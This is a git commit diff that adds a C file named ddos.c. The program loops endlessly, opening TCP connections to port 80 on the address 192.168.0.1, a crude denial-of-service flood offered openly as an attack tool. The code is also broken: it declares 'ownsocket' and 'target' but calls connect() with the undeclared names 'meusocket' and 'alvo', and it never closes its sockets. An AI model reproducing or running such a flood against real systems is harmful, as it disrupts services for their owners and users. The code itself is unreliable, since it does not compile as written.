06a7d872e58afb3c0681f56d1188f8cdc9616809
Andre Silva <silva603@gmail.com>
2020-08-10 22:22:47 -0300

    Update ddos.c

--- ddos.c
+++ ddos.c
@@ -1,1 +1,21 @@
+#include <stdio.h>
+#include <sys/socket.h>
+#include <netdb.h>
 
+int main(void){
+
+  int ownsocket;
+  int conn;
+  
+  struct sockaddr_in target;
+  
+  while(1){
+      ownsocket = socket(AF_INET,SOCK_STREAM,0);
+      target.sin_family = AF_INET;
+      target.sin_port = htons(80);
+      target.sin_addr.s_addr = inet_addr("192.168.0.1");
+  
+      conn = connect(meusocket, (struct sockaddr *)&alvo, sizeof alvo);
+  }
+  
+}
